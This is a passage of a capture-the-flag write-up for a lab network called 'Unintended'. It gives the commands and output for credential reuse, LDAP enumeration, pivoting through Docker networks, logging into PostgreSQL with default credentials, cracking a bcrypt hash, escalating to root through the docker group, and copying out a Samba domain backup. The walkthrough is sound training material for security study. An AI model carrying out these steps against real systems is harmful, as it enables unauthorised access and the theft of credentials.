![](/assets/vulnlab/chains/unintended/img/10.png)

The `.bash_history` file at <http://code.unintended.vl/juan/home-backup/src/branch/main/.bash_history> contains a passphrase for a SSH key set by juan.

![](/assets/vulnlab/chains/unintended/img/11.png)

## Domain enumeration (as juan)

The SSH passphrase is reused from juan's domain password:

```shell-session
└─$ nxc smb dc -u juan -p <JUAN_PASS>                           
SMB         10.10.228.197   445    DC               [*] Windows 6.1 Build 0 x32 (name:DC) (domain:unintended.vl) (signing:True) (SMBv1:False)
SMB         10.10.228.197   445    DC               [+] unintended.vl\juan:<JUAN_PASS>
```

Now that we have valid AD credentials we can perform some enumeration with `ldapsearch`.

To get the list of all users and computers:

```shell-session
└─$ LDAPTLS_REQCERT=never ldapsearch -H ldaps://dc -D juan@unintended.vl -w <JUAN_PASS> -LLL -s sub -b 'DC=unintended,DC=vl' '(objectclass=user)' 'samaccountname' | grep -i samaccountname: | cut -d' ' -f2
DC$
Administrator
krbtgt
cartor
Guest
abbie
BACKUP$
juan
WEB$
```

To get the list of all groups and their members:

```shell-session
└─$ LDAPTLS_REQCERT=never ldapsearch -H ldaps://dc -D juan@unintended.vl -w <JUAN_PASS> -LLL -s sub -b 'DC=unintended,DC=vl' '(objectclass=group)' 'member'
dn: CN=Remote Desktop Users,CN=Builtin,DC=unintended,DC=vl

dn: CN=Users,CN=Builtin,DC=unintended,DC=vl
member: CN=S-1-5-4,CN=ForeignSecurityPrincipals,DC=unintended,DC=vl
member: CN=Domain Users,CN=Users,DC=unintended,DC=vl
member: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=unintended,DC=vl

dn: CN=Replicator,CN=Builtin,DC=unintended,DC=vl

dn: CN=Domain Admins,CN=Users,DC=unintended,DC=vl
member: CN=Administrator,CN=Users,DC=unintended,DC=vl
member: CN=cartor,CN=Users,DC=unintended,DC=vl

dn: CN=Network Configuration Operators,CN=Builtin,DC=unintended,DC=vl

dn: CN=Enterprise Admins,CN=Users,DC=unintended,DC=vl
member: CN=Administrator,CN=Users,DC=unintended,DC=vl

dn: CN=Cryptographic Operators,CN=Builtin,DC=unintended,DC=vl

dn: CN=RAS and IAS Servers,CN=Users,DC=unintended,DC=vl

dn: CN=Group Policy Creator Owners,CN=Users,DC=unintended,DC=vl
member: CN=Administrator,CN=Users,DC=unintended,DC=vl

dn: CN=IIS_IUSRS,CN=Builtin,DC=unintended,DC=vl
member: CN=S-1-5-17,CN=ForeignSecurityPrincipals,DC=unintended,DC=vl

dn: CN=DnsAdmins,CN=Users,DC=unintended,DC=vl

dn: CN=Terminal Server License Servers,CN=Builtin,DC=unintended,DC=vl

dn: CN=Windows Authorization Access Group,CN=Builtin,DC=unintended,DC=vl
member: CN=S-1-5-9,CN=ForeignSecurityPrincipals,DC=unintended,DC=vl

dn: CN=Domain Computers,CN=Users,DC=unintended,DC=vl

dn: CN=Allowed RODC Password Replication Group,CN=Users,DC=unintended,DC=vl

dn: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=unintended,DC=vl
member: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=unintended,DC=vl

dn: CN=Account Operators,CN=Builtin,DC=unintended,DC=vl

dn: CN=Domain Users,CN=Users,DC=unintended,DC=vl

dn: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=unintended,DC=vl

dn: CN=Server Operators,CN=Builtin,DC=unintended,DC=vl

dn: CN=Performance Monitor Users,CN=Builtin,DC=unintended,DC=vl

dn: CN=Administrators,CN=Builtin,DC=unintended,DC=vl
member: CN=Administrator,CN=Users,DC=unintended,DC=vl
member: CN=Domain Admins,CN=Users,DC=unintended,DC=vl
member: CN=Enterprise Admins,CN=Users,DC=unintended,DC=vl

dn: CN=Denied RODC Password Replication Group,CN=Users,DC=unintended,DC=vl
member: CN=krbtgt,CN=Users,DC=unintended,DC=vl
member: CN=Domain Admins,CN=Users,DC=unintended,DC=vl
member: CN=Enterprise Admins,CN=Users,DC=unintended,DC=vl
member: CN=Group Policy Creator Owners,CN=Users,DC=unintended,DC=vl
member: CN=Read-only Domain Controllers,CN=Users,DC=unintended,DC=vl
member: CN=Domain Controllers,CN=Users,DC=unintended,DC=vl
member: CN=Cert Publishers,CN=Users,DC=unintended,DC=vl
member: CN=Schema Admins,CN=Users,DC=unintended,DC=vl

dn: CN=Incoming Forest Trust Builders,CN=Builtin,DC=unintended,DC=vl

dn: CN=Guests,CN=Builtin,DC=unintended,DC=vl
member: CN=Guest,CN=Users,DC=unintended,DC=vl
member: CN=Domain Guests,CN=Users,DC=unintended,DC=vl

dn: CN=Print Operators,CN=Builtin,DC=unintended,DC=vl

dn: CN=Read-only Domain Controllers,CN=Users,DC=unintended,DC=vl

dn: CN=Domain Controllers,CN=Users,DC=unintended,DC=vl

dn: CN=Certificate Service DCOM Access,CN=Builtin,DC=unintended,DC=vl

dn: CN=Performance Log Users,CN=Builtin,DC=unintended,DC=vl

dn: CN=Domain Guests,CN=Users,DC=unintended,DC=vl

dn: CN=Backup Operators,CN=Builtin,DC=unintended,DC=vl
member: CN=abbie,CN=Users,DC=unintended,DC=vl

dn: CN=Web Developers,CN=Users,DC=unintended,DC=vl
member: CN=juan,CN=Users,DC=unintended,DC=vl

dn: CN=Distributed COM Users,CN=Builtin,DC=unintended,DC=vl

dn: CN=Event Log Readers,CN=Builtin,DC=unintended,DC=vl

dn: CN=Cert Publishers,CN=Users,DC=unintended,DC=vl

dn: CN=Schema Admins,CN=Users,DC=unintended,DC=vl
member: CN=Administrator,CN=Users,DC=unintended,DC=vl

dn: CN=DnsUpdateProxy,CN=Users,DC=unintended,DC=vl

# refldaps://unintended.vl/CN=Configuration,DC=unintended,DC=vl

# refldaps://unintended.vl/DC=DomainDnsZones,DC=unintended,DC=vl

# refldaps://unintended.vl/DC=ForestDnsZones,DC=unintended,DC=vl
```

juan is a member of `Web Developers`, abbie is a member of `Backup Operators` and cartor is a member of `Domain Admins`.

## SSH to WEB (as juan)

Juan can SSH into target 2. Do not forget to [specify the domain in the SSH login username](https://unix.stackexchange.com/questions/322203/attempting-to-connect-ssh-to-a-machine-using-a-domain).

```shell-session
└─$ sshpass -p <JUAN_PASS> ssh -l juan@unintended.vl web.unintended.vl
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-97-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Sat Apr 27 01:16:46 AM UTC 2024

  System load:                      0.005859375
  Usage of /:                       72.1% of 9.75GB
  Memory usage:                     55%
  Swap usage:                       0%
  Processes:                        171
  Users logged in:                  0
  IPv4 address for br-1c74e0922629: 172.19.0.1
  IPv4 address for br-9f7c921da56a: 172.18.0.1
  IPv4 address for br-d2d8c10f2c77: 172.21.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for ens5:            10.10.156.134


Expanded Security Maintenance for Applications is not enabled.

13 updates can be applied immediately.
8 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Apr 27 01:15:22 2024 from 10.8.1.246
juan@unintended.vl@web:~$
```

Let's do some basic enumeration:

```shell-session
juan@unintended.vl@web:~$ id
uid=320201103(juan@unintended.vl) gid=320200513(domain users@unintended.vl) groups=320200513(domain users@unintended.vl),320201106(web developers@unintended.vl)
```

```shell-session
juan@unintended.vl@web:~$ realm list
unintended.vl
  type: kerberos
  realm-name: UNINTENDED.vl
  domain-name: unintended.vl
  configured: kerberos-member
  server-software: active-directory
  client-software: sssd
  required-package: sssd-tools
  required-package: sssd
  required-package: libnss-sss
  required-package: libpam-sss
  required-package: adcli
  required-package: samba-common-bin
  login-formats: %U@unintended.vl
  login-policy: allow-permitted-logins
  permitted-logins: administrator@unintended.vl, juan@unintended.vl, abbie@unintended.vl
  permitted-groups: 
```

```shell-session
juan@unintended.vl@web:~$ ls /home/
abbie@unintended.vl  administrator@unintended.vl  juan@unintended.vl  svc
```

```shell-session
juan@unintended.vl@web:~$ ls -lah
total 32K
drwxr-xr-x 3 juan@unintended.vl domain users@unintended.vl 4.0K Mar 30 08:37 .
drwxr-xr-x 6 root               root                       4.0K Mar 30 09:32 ..
lrwxrwxrwx 1 root               root                          9 Feb 24 19:50 .bash_history -> /dev/null
-rw-r--r-- 1 juan@unintended.vl domain users@unintended.vl  220 Feb 24 19:45 .bash_logout
-rw-r--r-- 1 juan@unintended.vl domain users@unintended.vl 3.7K Feb 24 19:45 .bashrc
drwx------ 2 juan@unintended.vl domain users@unintended.vl 4.0K Feb 24 19:45 .cache
-rw-r----- 1 juan@unintended.vl root                         37 Mar 30 08:37 flag.txt
-rw-r--r-- 1 juan@unintended.vl root                         47 Feb 24 19:47 .k5login
-rw-r--r-- 1 juan@unintended.vl domain users@unintended.vl  807 Feb 24 19:45 .profile
```

We get the first flag:

```shell-session
juan@unintended.vl@web:~$ cat flag.txt 
VL{...}
```

## Mattermost (as juan)

We can now login to the Mattermost webapp at <http://chat.unintended.vl/login> with the email `juan@unintended.vl` and the password we found, and look through the chat history.

![](/assets/vulnlab/chains/unintended/img/12.png)

![](/assets/vulnlab/chains/unintended/img/13.png)

![](/assets/vulnlab/chains/unintended/img/14.png)

We find messages mentioning a PostgreSQL database for Mattermost, and a hint that abbie is likely using name + birthyear as a password.

## Mattermost (PostgreSQL database)

### Locating the right container

Let's try to access the PostgreSQL database of the Mattermost instance to extract secrets.

The important hint we can get from the messages is that Mattermost is using a PostgreSQL database (which by defaults listens on port 5432). From the messages and the Docker related files in the `DevOps` repository we found earlier, we can deduce that the Mattermost instance is deployed via Docker.

The PostgreSQL port is not forwarded to the host itself, so we need to find the Docker subnet that the Mattermost instance is using:

```shell-session
juan@unintended.vl@web:~$ netstat -ntlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:8200            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:222           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:39435         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:8065            0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::8200                 :::*                    LISTEN      -                   
tcp6       0      0 :::8065                 :::*                    LISTEN      -                   
```

By searching for `docker default ip address range` etc., we can find resources that indicate that Docker networks are likely assigned subnets starting from `172.17.0.0/16` then `172.18.0.0/16`...

- <https://docs.storagemadeeasy.com/appliance/docker_networking>
- <https://www.reddit.com/r/docker/comments/s8obru/how_does_docker_assign_ipsubets/>
- <https://github.com/moby/libnetwork/blob/master/ipamutils/utils.go#L10-L22>

We can check for used subnets using `ip a`:

```shell-session
juan@unintended.vl@web:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: ens5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc mq state UP group default qlen 1000
    link/ether 0a:c3:8e:43:af:49 brd ff:ff:ff:ff:ff:ff
    altname enp0s5
    inet 10.10.250.166/28 metric 100 brd 10.10.250.175 scope global dynamic ens5
       valid_lft 3540sec preferred_lft 3540sec
    inet6 fe80::8c3:8eff:fe43:af49/64 scope link
       valid_lft forever preferred_lft forever
3: br-1c74e0922629: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:ea:1d:38:d9 brd ff:ff:ff:ff:ff:ff
    inet 172.19.0.1/16 brd 172.19.255.255 scope global br-1c74e0922629
       valid_lft forever preferred_lft forever
    inet6 fe80::42:eaff:fe1d:38d9/64 scope link
       valid_lft forever preferred_lft forever
4: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default
    link/ether 02:42:df:52:18:6b brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
5: br-9f7c921da56a: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:f9:15:67:12 brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-9f7c921da56a
       valid_lft forever preferred_lft forever
    inet6 fe80::42:f9ff:fe15:6712/64 scope link
       valid_lft forever preferred_lft forever
6: br-d2d8c10f2c77: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:f4:72:1c:59 brd ff:ff:ff:ff:ff:ff
    inet 172.21.0.1/16 brd 172.21.255.255 scope global br-d2d8c10f2c77
       valid_lft forever preferred_lft forever
    inet6 fe80::42:f4ff:fe72:1c59/64 scope link
       valid_lft forever preferred_lft forever
...
```

The potential subnets are `172.17.0.0/16`, `172.18.0.0/16`, `172.19.0.0/16` and `172.21.0.0/16`.

The ARP cache also gives us a hint, although it doesn't display every container:

```shell-session
juan@unintended.vl@web:~$ arp -an
? (10.10.250.161) at 0a:6c:d2:45:9c:03 [ether] on ens5
? (10.10.250.165) at 0a:3d:e9:94:28:43 [ether] on ens5
? (172.21.0.2) at 02:42:ac:15:00:02 [ether] on br-d2d8c10f2c77
? (172.18.0.2) at 02:42:ac:12:00:02 [ether] on br-9f7c921da56a
? (172.19.0.3) at 02:42:ac:13:00:03 [ether] on br-1c74e0922629
? (172.19.0.2) at 02:42:ac:13:00:02 [ether] on br-1c74e0922629
```

For every subnet, `172.X.0.1` is the host itself and the containers start at `172.X.0.2`. We can ping them one by one to see if they are up and then scan them with `nmap` through the SOCKS proxy we setup earlier to check if port 5432 is open.

With trial and error we find out that `172.21.0.3` is the PostgreSQL database instance used by Mattermost.

```shell-session
└─$ proxychains -q nmap 172.21.0.3
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-27 01:53 CEST
Nmap scan report for 172.21.0.3
Host is up (0.017s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT     STATE SERVICE
5432/tcp open  postgresql

Nmap done: 1 IP address (1 host up) scanned in 18.53 seconds
```

### Default credentials

By searching for `mattermost docker postgres install` we stumble on a [guide in the official documentation](https://docs.mattermost.com/install/install-docker.html). The following section is interesting:

![](/assets/vulnlab/chains/unintended/img/15.png)

In the [GitHub repository](https://github.com/mattermost/docker) referenced in the article there's a `env.example` file containing the default credentials for PostgreSQL.

![](/assets/vulnlab/chains/unintended/img/16.png)

```shell-session
└─$ PGPASSWORD=mmuser_password proxychains psql -h 172.21.0.3 -d mattermost -U mmuser                                        
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
psql (16.2 (Debian 16.2-1), server 13.14)
Type "help" for help.

mattermost=# 
```

It works for our target!

### Exfiltration

Let's do some [basic PostgreSQL enumeration](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql):

```sql
mattermost=# \pset pager 0
Pager usage is off.
```

```sql
mattermost=# \list
                                                    List of databases
    Name    | Owner  | Encoding | Locale Provider |  Collate   |   Ctype    | ICU Locale | ICU Rules | Access privileges 
------------+--------+----------+-----------------+------------+------------+------------+-----------+-------------------
 mattermost | mmuser | UTF8     | libc            | en_US.utf8 | en_US.utf8 |            |           | 
 postgres   | mmuser | UTF8     | libc            | en_US.utf8 | en_US.utf8 |            |           | 
 template0  | mmuser | UTF8     | libc            | en_US.utf8 | en_US.utf8 |            |           | =c/mmuser        +
            |        |          |                 |            |            |            |           | mmuser=CTc/mmuser
 template1  | mmuser | UTF8     | libc            | en_US.utf8 | en_US.utf8 |            |           | =c/mmuser        +
            |        |          |                 |            |            |            |           | mmuser=CTc/mmuser
(4 rows)
```

```sql
mattermost=# \d
                     List of relations
 Schema |               Name               | Type  | Owner
--------+----------------------------------+-------+--------
 public | audits                           | table | mmuser
 public | bots                             | table | mmuser
 public | channelmemberhistory             | table | mmuser
 public | channelmembers                   | table | mmuser
 public | channels                         | table | mmuser
 public | clusterdiscovery                 | table | mmuser
 public | commands                         | table | mmuser
 public | commandwebhooks                  | table | mmuser
 public | compliances                      | table | mmuser
 public | db_lock                          | table | mmuser
 public | db_migrations                    | table | mmuser
 public | drafts                           | table | mmuser
 public | emoji                            | table | mmuser
 public | fileinfo                         | table | mmuser
 public | focalboard_blocks                | table | mmuser
 public | focalboard_blocks_history        | table | mmuser
 public | focalboard_board_members         | table | mmuser
 public | focalboard_board_members_history | table | mmuser
 public | focalboard_boards                | table | mmuser
 public | focalboard_boards_history        | table | mmuser
 public | focalboard_categories            | table | mmuser
 public | focalboard_category_boards       | table | mmuser
 public | focalboard_file_info             | table | mmuser
 public | focalboard_notification_hints    | table | mmuser
 public | focalboard_preferences           | table | mmuser
 public | focalboard_schema_migrations     | table | mmuser
 public | focalboard_sessions              | table | mmuser
 public | focalboard_sharing               | table | mmuser
 public | focalboard_subscriptions         | table | mmuser
 public | focalboard_system_settings       | table | mmuser
 public | focalboard_teams                 | table | mmuser
 public | focalboard_users                 | table | mmuser
 public | groupchannels                    | table | mmuser
 public | groupmembers                     | table | mmuser
 public | groupteams                       | table | mmuser
 public | incomingwebhooks                 | table | mmuser
 public | ir_category                      | table | mmuser
 public | ir_category_item                 | table | mmuser
 public | ir_channelaction                 | table | mmuser
 public | ir_incident                      | table | mmuser
 public | ir_metric                        | table | mmuser
 public | ir_metricconfig                  | table | mmuser
 public | ir_playbook                      | table | mmuser
 public | ir_playbookautofollow            | table | mmuser
 public | ir_playbookmember                | table | mmuser
 public | ir_run_participants              | table | mmuser
 public | ir_statusposts                   | table | mmuser
 public | ir_system                        | table | mmuser
 public | ir_timelineevent                 | table | mmuser
 public | ir_userinfo                      | table | mmuser
 public | ir_viewedchannel                 | table | mmuser
 public | jobs                             | table | mmuser
 public | licenses                         | table | mmuser
 public | linkmetadata                     | table | mmuser
 public | notifyadmin                      | table | mmuser
 public | oauthaccessdata                  | table | mmuser
 public | oauthapps                        | table | mmuser
 public | oauthauthdata                    | table | mmuser
 public | outgoingwebhooks                 | table | mmuser
 public | pluginkeyvaluestore              | table | mmuser
 public | postacknowledgements             | table | mmuser
 public | postreminders                    | table | mmuser
 public | posts                            | table | mmuser
 public | postspriority                    | table | mmuser
 public | preferences                      | table | mmuser
 public | productnoticeviewstate           | table | mmuser
 public | publicchannels                   | table | mmuser
 public | reactions                        | table | mmuser
 public | recentsearches                   | table | mmuser
 public | remoteclusters                   | table | mmuser
 public | retentionidsfordeletion          | table | mmuser
 public | retentionpolicies                | table | mmuser
 public | retentionpolicieschannels        | table | mmuser
 public | retentionpoliciesteams           | table | mmuser
 public | roles                            | table | mmuser
 public | schemes                          | table | mmuser
 public | sessions                         | table | mmuser
 public | sharedchannelattachments         | table | mmuser
 public | sharedchannelremotes             | table | mmuser
 public | sharedchannels                   | table | mmuser
 public | sharedchannelusers               | table | mmuser
 public | sidebarcategories                | table | mmuser
 public | sidebarchannels                  | table | mmuser
 public | status                           | table | mmuser
 public | systems                          | table | mmuser
 public | teammembers                      | table | mmuser
 public | teams                            | table | mmuser
 public | termsofservice                   | table | mmuser
 public | threadmemberships                | table | mmuser
 public | threads                          | table | mmuser
 public | tokens                           | table | mmuser
 public | trueupreviewhistory              | table | mmuser
 public | uploadsessions                   | table | mmuser
 public | useraccesstokens                 | table | mmuser
 public | usergroups                       | table | mmuser
 public | users                            | table | mmuser
 public | usertermsofservice               | table | mmuser
(97 rows)
```

In the `posts` table we find a new potential password:

```sql
mattermost=# select message from posts;
...
 Here, `<ABBIE_PASS>`, change it to one you can actually *remember*, and please make sure you do so lol I have way more important things to do than resetting your passwords  :joy:
```

It works as abbie's domain password:

```shell-session
└─$ nxc smb dc -u abbie -p <ABBIE_PASS>   
SMB         10.10.156.133   445    DC               [*] Windows 6.1 Build 0 x32 (name:DC) (domain:unintended.vl) (signing:True) (SMBv1:False)
SMB         10.10.156.133   445    DC               [+] unintended.vl\abbie:<ABBIE_PASS>
```

Another method is to try to crack abbie's hash:

```sql
mattermost=# select email,password from users;
          email          |                           password                           
-------------------------+--------------------------------------------------------------
 channelexport@localhost | 
 feedbackbot@localhost   | 
 appsbot@localhost       | 
 calls@localhost         | 
 playbooks@localhost     | 
 boards@localhost        | 
 system-bot@localhost    | 
 juan@unintended.vl      | $2a$10$XVsJbRoMGb3NmEkOV2bVhuaf2zf2U90z1BH1LR5.9EVphcIClf7aa
 cartor@unintended.vl    | $2a$10$1LN52Ej8HDksuM51/a6yDeLEQsw5F6pOQRYNxNQZEGezBreDaMRC.
 abbie@unintended.vl     | $2a$10$2INgG1HdPQqqvv/.ljUi/uQb5FGfKxRiYWCoZWUZI1ZIeOE0aV0mu
(10 rows)
```

```shell-session
└─$ hashid -m '$2a$10$2INgG1HdPQqqvv/.ljUi/uQb5FGfKxRiYWCoZWUZI1ZIeOE0aV0mu'                        
Analyzing '$2a$10$2INgG1HdPQqqvv/.ljUi/uQb5FGfKxRiYWCoZWUZI1ZIeOE0aV0mu'
[+] Blowfish(OpenBSD) [Hashcat Mode: 3200]
[+] Woltlab Burning Board 4.x 
[+] bcrypt [Hashcat Mode: 3200]
```

We already know that abbie is likely using name + birthyear as a password. First we find abbie's full name by clicking on the user icon:

![](/assets/vulnlab/chains/unintended/img/17.png)

Then we generate a wordlist of possible candidates with [cook](https://github.com/glitchedgitz/cook).

```shell-session
└─$ cook abbie,spencer,Abbie,Spencer,theabbs 1920-2024 > abbie.wordlist
```

```shell-session
└─$ hashcat -a0 -m3200 '$2a$10$2INgG1HdPQqqvv/.ljUi/uQb5FGfKxRiYWCoZWUZI1ZIeOE0aV0mu' abbie.wordlist
...
$2a$10$2INgG1HdPQqqvv/.ljUi/uQb5FGfKxRiYWCoZWUZI1ZIeOE0aV0mu:Abbie1998
```

By logging in with email `abbie@unintended.vl` and password `Abbie1998` we can then find the same message as above.

![](/assets/vulnlab/chains/unintended/img/18.png)

## SSH to BACKUP (as abbie)

Abbie can SSH into target 3.

```shell-session
└─$ sshpass -p <ABBIE_PASS> ssh -l abbie@unintended.vl backup.unintended.vl
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-97-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Sat Apr 27 01:26:39 AM UTC 2024

  System load:  0.0205078125      Processes:                112
  Usage of /:   41.5% of 9.75GB   Users logged in:          0
  Memory usage: 14%               IPv4 address for docker0: 172.17.0.1
  Swap usage:   0%                IPv4 address for ens5:    10.10.156.135


Expanded Security Maintenance for Applications is not enabled.

13 updates can be applied immediately.
8 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Apr 27 01:25:24 2024 from 10.8.1.246
abbie@unintended.vl@backup:~$ 
```

```shell-session
abbie@unintended.vl@backup:~$ id
uid=320201104(abbie@unintended.vl) gid=320200513(domain users@unintended.vl) groups=320200513(domain users@unintended.vl),119(docker)
```

Abbie is in the `docker` group which makes it trivial to become root on the host by [mounting the root filesystem in a container](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#docker-group).

Since the target doesn't have internet access we need to use an existing image.

```shell-session
abbie@unintended.vl@backup:~$ docker image ls
REPOSITORY   TAG           IMAGE ID       CREATED         SIZE
python       3.11.2-slim   4d2191666712   13 months ago   128MB
```

```shell-session
abbie@unintended.vl@backup:~$ docker run -it --rm -v /:/mnt python:3.11.2-slim chroot /mnt bash
root@9ac5c6621b4e:/# 
```

```shell-session
root@9ac5c6621b4e:/# ls -la /root/
total 40
drwx------  7 root root 4096 Mar 30 09:12 .
drwxr-xr-x 19 root root 4096 Feb 24 19:06 ..
lrwxrwxrwx  1 root root    9 Mar 30 08:38 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
drwx------  2 root root 4096 Feb 24 19:09 .cache
drwxr-xr-x  3 root root 4096 Feb 24 19:08 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
drwx------  2 root root 4096 Feb 24 20:07 .ssh
-rw-r--r--  1 root root    0 Mar 30 09:12 .sudo_as_admin_successful
-rw-r--r--  1 root root   37 Mar 30 08:40 flag.txt
drwxr-xr-x  3 svc  svc  4096 Feb 15 18:31 scripts
drwx------  3 root root 4096 Feb 24 19:06 snap
```

We get the second flag:

```shell-session
root@9ac5c6621b4e:~# cat flag.txt 
VL{...}
```

## Getting the Samba backup

We can also enumerate and run commands in existing containers:

```shell-session
abbie@unintended.vl@backup:~$ docker ps
CONTAINER ID   IMAGE                COMMAND           CREATED        STATUS             PORTS     NAMES
3b4fb11f4672   python:3.11.2-slim   "sh ./setup.sh"   2 months ago   Up About an hour             scripts_ftp_1
```

`scripts_ftp_1` seems to be for the FTP service running on port 21.

```shell-session
abbie@unintended.vl@backup:~$ docker exec -it scripts_ftp_1 bash
root@ftp:/ftp# 
```

```shell-session
root@ftp:/ftp# ls -la
total 20
drwxr-xr-x 3 root root 4096 Feb 24 19:56 .
drwxr-xr-x 1 root root 4096 Feb 24 19:56 ..
-rw-r--r-- 1 1000 1000  387 Feb 15 18:31 server.py
-rw-r--r-- 1 1000 1000   60 Feb 15 18:29 setup.sh
drwxr-xr-x 4 root root 4096 Jan 25 08:36 volumes
```

```shell-session
root@ftp:/ftp# ls -la volumes/
total 16
drwxr-xr-x 4 root root 4096 Jan 25 08:36 .
drwxr-xr-x 3 root root 4096 Feb 24 19:56 ..
drw-rw---- 2 root root 4096 Jan 25 07:13 docker_src
drw-rw---- 2 root root 4096 Feb 17 20:33 domain_backup
```

There are some Duplicati backup files:

```shell-session
root@ftp:/ftp# ls -la volumes/docker_src/
total 140100
drw-rw---- 2 root root     4096 Jan 25 07:13 .
drwxr-xr-x 4 root root     4096 Jan 25 08:36 ..
-rw-rw---- 1 root root   142245 Jan 25 07:13 duplicati-20240125T071045Z.dlist.zip
-rw-rw---- 1 root root 38225049 Jan 25 07:13 duplicati-b71dd219377964328aa2c79f4bc7354a5.dblock.zip
-rw-rw---- 1 root root 52343646 Jan 25 07:12 duplicati-b9d86c254096f4531b0be8e536a59ff07.dblock.zip
-rw-rw---- 1 root root 52344341 Jan 25 07:11 duplicati-ba27818c8bd7a4ea6a506fde8314c48d1.dblock.zip
-rw-rw---- 1 root root   139304 Jan 25 07:11 duplicati-i48680ba57a084652a109d584aebc63a9.dindex.zip
-rw-rw---- 1 root root    75366 Jan 25 07:12 duplicati-i570def036a8d475c9ec47b861bee206a.dindex.zip
-rw-rw---- 1 root root   161831 Jan 25 07:13 duplicati-ie324293d766446ddbe27823f52e30d4c.dindex.zip
```

There's also a Samba backup (likely of the AD database):

```shell-session
root@ftp:/ftp# ls -la volumes/domain_backup/
total 1628
drw-rw---- 2 root root    4096 Feb 17 20:33 .
drwxr-xr-x 4 root root    4096 Jan 25 08:36 ..
-rw-rw---- 1 root root 1654914 Feb 17 20:33 samba-backup-2024-02-17T20-32-13.580437.tar.bz2
```

Let's transfer it to our attack machine:

```shell-session
abbie@unintended.vl@backup:~$ docker cp scripts_ftp_1:/ftp/volumes/domain_backup/samba-backup-2024-02-17T20-32-13.580437.tar.bz2 .
Successfully copied 1.66MB to /home/abbie@unintended.vl/.
```

```shell-session
└─$ sshpass -p <ABBIE_PASS> scp abbie@unintended.vl@backup.unintended.vl:samba-backup-2024-02-17T20-32-13.580437.tar.bz2 .  
```

Extract the backup:

```shell-session
└─$ mkdir backup && tar -xvf samba-backup-2024-02-17T20-32-13.580437.tar.bz2 -C backup
sysvol.tar.gz
backup.txt
private/secrets.tdb
private/privilege.ldb
private/sam.ldb
private/dns_update_list
private/spn_update_list
private/schannel_store.tdb
private/krb5.conf
private/secrets.ldb
private/passdb.tdb
private/idmap.ldb
private/dns_update_cache
private/secrets.keytab
private/encrypted_secrets.key
private/hklm.ldb
private/share.ldb
private/tls/ca.pem
private/tls/cert.pem
private/tls/key.pem
private/sam.ldb.d/DC=DOMAINDNSZONES,DC=UNINTENDED,DC=VL.ldb
private/sam.ldb.d/CN=CONFIGURATION,DC=UNINTENDED,DC=VL.ldb
private/sam.ldb.d/metadata.tdb
private/sam.ldb.d/DC=FORESTDNSZONES,DC=UNINTENDED,DC=VL.ldb
private/sam.ldb.d/DC=UNINTENDED,DC=VL.ldb
private/sam.ldb.d/CN=SCHEMA,CN=CONFIGURATION,DC=UNINTENDED,DC=VL.ldb
state/share_info.tdb
state/group_mapping.tdb
state/winbindd_cache.tdb
state/registry.tdb
state/account_policy.tdb
etc/smb.conf.bak
